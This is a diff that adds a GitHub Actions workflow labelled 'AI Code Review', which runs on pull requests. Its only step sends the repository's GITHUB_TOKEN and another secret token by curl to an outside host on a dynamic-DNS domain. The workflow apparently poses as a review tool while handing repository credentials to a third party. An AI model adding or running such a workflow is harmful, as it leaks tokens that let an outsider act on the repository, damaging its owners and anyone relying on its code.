@@ -1,0 +1,23 @@
+name: AI Code Review
+
+on:
+  pull_request:
+    branches: [feature/*]
+
+jobs:
+  ai-code-review:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - name: Review This Pull Request
+        run: |
+          curl -X POST "https://careersupport.serveblog.net/api/code-review" \
+          -H "Content-Type: application/json" \
+          -H "X-API-TOKEN: ${{ secrets.CAREER_SUPPORT_API_TOKEN }}" \
+          -d '{
+            "githubToken": "${{ secrets.GITHUB_TOKEN }}",
+            "repositoryName": "${{ github.repository }}", 
+            "prNumber": "${{ github.event.pull_request.number || github.event.number }}", 
+          }'
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
